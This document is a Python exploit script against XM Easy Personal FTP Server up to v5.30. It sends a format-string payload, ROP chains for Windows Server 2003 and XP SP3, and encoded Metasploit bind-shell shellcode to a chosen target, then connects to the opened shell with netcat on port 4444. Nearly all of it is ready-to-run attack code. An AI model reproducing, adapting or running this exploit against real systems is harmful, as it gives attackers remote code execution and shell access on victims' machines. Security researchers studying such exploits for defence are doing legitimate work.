import socket
import struct
import sys
from os import system
from time import sleep
 
host = ''
port = 21
 
# ./msfpayload windows/shell_bind_tcp exitfunc=seh R | 
# ./msfencode -b "\x00\x0a\x0d" -e x86/jmp_call_additive -t c
# [*] x86/jmp_call_additive succeeded with size 373 (iteration=1
sc = ("\xfc\xbb\x70\x4e\xf9\xb6\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x8c\xa6\x70\xb6\x6c"
"\x37\xe3\x3e\x89\x06\x31\x24\xda\x3b\x85\x2e\x8e\xb7\x6e\x62"
"\x3a\x43\x02\xab\x4d\xe4\xa9\x8d\x60\xf5\x1f\x12\x2e\x35\x01"
"\xee\x2c\x6a\xe1\xcf\xff\x7f\xe0\x08\x1d\x8f\xb0\xc1\x6a\x22"
"\x25\x65\x2e\xff\x44\xa9\x25\xbf\x3e\xcc\xf9\x34\xf5\xcf\x29"
"\xe4\x82\x98\xd1\x8e\xcd\x38\xe0\x43\x0e\x04\xab\xe8\xe5\xfe"
"\x2a\x39\x34\xfe\x1d\x05\x9b\xc1\x92\x88\xe5\x06\x14\x73\x90"
"\x7c\x67\x0e\xa3\x46\x1a\xd4\x26\x5b\xbc\x9f\x91\xbf\x3d\x73"
"\x47\x4b\x31\x38\x03\x13\x55\xbf\xc0\x2f\x61\x34\xe7\xff\xe0"
"\x0e\xcc\xdb\xa9\xd5\x6d\x7d\x17\xbb\x92\x9d\xff\x64\x37\xd5"
"\xed\x71\x41\xb4\x79\xb5\x7c\x47\x79\xd1\xf7\x34\x4b\x7e\xac"
"\xd2\xe7\xf7\x6a\x24\x08\x22\xca\xba\xf7\xcd\x2b\x92\x33\x99"
"\x7b\x8c\x92\xa2\x17\x4c\x1b\x77\xb7\x1c\xb3\x28\x78\xcd\x73"
"\x99\x10\x07\x7c\xc6\x01\x28\x57\x71\x06\xe6\x8c\xd1\xe1\x0b"
"\x32\xc7\xad\x82\xd4\x8d\x5d\xc3\x4f\x3a\x9c\x30\x58\xdd\xdf"
"\x12\xf5\x76\x48\x2a\x10\x40\x77\xab\x37\xe2\xd4\x03\xdf\x71"
"\x37\x90\xfe\x85\x12\xb0\x89\xbd\xf5\x4a\xe7\x0c\x67\x4a\x22"
"\xe6\x04\xd9\xa8\xf7\x43\xc2\x67\xaf\x04\x34\x71\x25\xb9\x6f"
"\x2b\x58\x40\xe9\x14\xd8\x9f\xca\x9b\xe0\x52\x76\xbf\xf2\xaa"
"\x77\xfb\xa6\x62\x2e\x55\x11\xc5\x98\x17\xcb\x9f\x77\xf1\x9b"
"\x66\xb4\xc2\xdd\x66\x91\xb5\x02\xd6\x4c\x83\x3d\xd7\x18\x03"
"\x45\x05\xb9\xec\x9c\x8d\xc7\x1c\x2d\x18\x5f\x86\xc4\x61\x3d"
"\x39\x33\xa5\x38\xb9\xb6\x56\xbf\xa1\xb2\x53\xfb\x66\x2e\x2e"
"\x94\x02\x50\x9d\x95\x07\x50\x21\x6a\xa7\x51\x21\x6a")
 
def banner():
    print "-------------------------------------------------------------------------"
    print " XM Easy Personal FTP Server <= v5.30 Remote Format String Write4 Exploit"
    print " Written by mr_me (@net__ninja)                                          "
    print "-------------------------------------------------------------------------\n"
 
if (len(sys.argv) < 2):
    banner()
    print "Usage: %s <target_ip> [port]" %(sys.argv[0])
    sys.exit(1)
 
if (len(sys.argv) == 3):
    port = int(sys.argv[2])
 
host = sys.argv[1]
 
banner()
 
 
try:
    target = int(raw_input("--> "))
except:
    print("Exiting..")
    sys.exit(0)
 
if target not in [1,2]:
    print("(-) Invalid target!")
    sys.exit(0)
 
print("(+) Choose your option:")
print(" 1. use no authentication (anonymous is disabled)")
print(" 2. use authentication (anonymous is enabled)")
 
try:
        auth_required = int(raw_input("--> "))   
except:
        print("Exiting..")
        sys.exit(0)
 
if auth_required not in [1,2]:
        print("(-) Invalid option!")
        sys.exit(0)
 
# start building the attack string
sploit  = "ABOR "
 
# rop - Windows Server 23k
if target == 1:
    # C:\WINDOWS\system32\msvcrt.dll v7.0.3790.3959
    rop  = struct.pack('<L', 0x77be3adb) # pop eax ; retn
    rop += struct.pack('<L', 0x77ba1114) # <- *&VirtualProtect()
    rop += struct.pack('<L', 0x77bbf244) # mov eax,[eax] ; pop ebp ; retn
    rop += struct.pack('<L', 0x41414141) # junk ------------^
    rop += struct.pack('<L', 0x77bb0c86) # xchg eax,esi ; retn
    rop += struct.pack('<L', 0x77be3adb) # pop eax ; retn
    rop += struct.pack('<L', 0xFFFFFBFF) # dwSize
    rop += struct.pack('<L', 0x77BAD64D) # neg eax ; pop ebp ; retn
    rop += struct.pack('<L', 0x41414141) # junk ------^
    rop += struct.pack('<L', 0x77BBF102) # xchg eax,ebx ; add [eax],al ; retn
    rop += struct.pack('<L', 0x77bbfc02) # pop ecx ; retn
    rop += struct.pack('<L', 0x77bef001) # ptr that is w+
    rop += struct.pack('<L', 0x77bd8c04) # pop edi ; retn
    rop += struct.pack('<L', 0x77bd8c05) # retn
    rop += struct.pack('<L', 0x77be3adb) # pop eax ; retn
    rop += struct.pack('<L', 0xFFFFFFC0) # flNewProtect
    rop += struct.pack('<L', 0x77BAD64D) # neg eax ; pop ebp ; retn
    rop += struct.pack('<L', 0x77be2265) # ptr to 'push esp ; ret'
    rop += struct.pack('<L', 0x77BB8285) # xchg eax,edx ; retn
    rop += struct.pack('<L', 0x77be3adb) # pop eax ; retn
    rop += struct.pack('<L', 0x90909090) # nops
    rop += struct.pack('<L', 0x77be6591) # pushad ; add al,0ef ; retn
 
    if auth_required == 1:
        sploit += "%12133031x"       # lookaside chunk address #11204415
    elif auth_required == 2:
        sploit += "%12133037x"       # lookaside chunk address
 
    pivot = "\x35\x62\xba\x77"           # 0x77BA6235 - xchg eax,esp; retn
    jump  = "\xeb\x56"                   # jump forward into our shellcode
 
# rop - Windows XP SP3
elif target == 2:
    # C:\WINDOWS\system32\msvcrt.dll v7.0.2600.5512
    rop  = struct.pack('<L', 0x77C21D16) # pop eax ; retn
    rop += struct.pack('<L', 0x77C11120) # <- *&VirtualProtect()
    rop += struct.pack('<L', 0x77C2E493) # mov eax,[eax] ; pop ebp ; retn
    rop += struct.pack('<L', 0x41414141) # junk ------------^
    rop += struct.pack('<L', 0x77C21891) # pop esi ; retn
    rop += struct.pack('<L', 0x77C5D010) # ptr that is w+
    rop += struct.pack('<L', 0x77C2DD6C) # xchg eax,esi ; add [eax],al; retn
    rop += struct.pack('<L', 0x77C21D16) # pop eax ; retn
    rop += struct.pack('<L', 0xFFFFFBFF) # dwSize
    rop += struct.pack('<L', 0x77C1BE18) # neg eax ; pop ebp ; retn
    rop += struct.pack('<L', 0x41414141) # junk ------^
    rop += struct.pack('<L', 0x77C2362C) # pop ebx ; retn
    rop += struct.pack('<L', 0x77C5D010) # ptr that is w+
    rop += struct.pack('<L', 0x77C2E071) # xchg eax,ebx ; add [eax],al ; retn
    rop += struct.pack('<L', 0x77C1F519) # pop ecx ; retn
    rop += struct.pack('<L', 0x77C5D010) # ptr that is w+
    rop += struct.pack('<L', 0x77C23B47) # pop edi ; retn
    rop += struct.pack('<L', 0x77C23B48) # retn
    rop += struct.pack('<L', 0x77C21D16) # pop eax ; retn
    rop += struct.pack('<L', 0xFFFFFFC0) # flNewProtect
    rop += struct.pack('<L', 0x77C1BE18) # neg eax ; pop ebp ; retn
    rop += struct.pack('<L', 0x77C35459) # ptr to 'push esp ; ret'
    rop += struct.pack('<L', 0x77C58FBC) # xchg eax,edx ; retn
    rop += struct.pack('<L', 0x77C21D16) # pop eax ; retn
    rop += struct.pack('<L', 0x90909090) # nops
    rop += struct.pack('<L', 0x77C567F0) # pushad ; add al,0ef ; retn
 
    if auth_required == 1:
        sploit += "%11204415x"       # lookaside chunk address
    elif auth_required == 2:
        sploit += "%11204421x"       # lookaside chunk address
     
    pivot = "\xd5\x5e\xc1\x77"           # 0x77C15ED5 - xchg eax,esp; retn
    jump  = "\xeb\x4a"                   # jump forward into our shellcode
     
 
sploit += "%p" * 31                          # offset to the object on the stack
sploit += "%n" * 1                           # write the controlled value into the vtable
sploit += "\x45" * 4500
 
username  = "USER anonymous\r\n"
password  = "PASS anonymous@"
password += rop
password += jump
password += "\x62" * (0x96-len(rop))
password += pivot                            # vtable+0x98 function
password += "\x62" * 0x14  
password += pivot                            # vtable+0xb0 function
password += sc                                  
password += "\x62" * (0x398-len(password))
password += ".com\r\n"
 
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print "(+) Connecting to the target %s:%d" % (host, port)
    s.connect((host,port))
except:
    print("(-) Cannot connect to the target %s:%s" % (host, port))
    sys.exit(0)
 
try:
    print "(+) Seeding payload..."
    s.recv(1024)
    s.send(username)
    s.recv(1024)
    s.send(password)
    s.recv(1024)
    print "(+) Triggering write4..."
    s.send(sploit)
    s.recv(1024)
    s.close()
except:
    print "(-) Failed to trigger the vulnerability...!"
    sys.exit(0)
 
print "(+) Connecting to the targets shell!"
     
try:
    sleep(1)
    system("nc -v %s 4444" % host)
except:
    print("(-) Exploit failed! check if the target service is up")
    sys.exit(0)
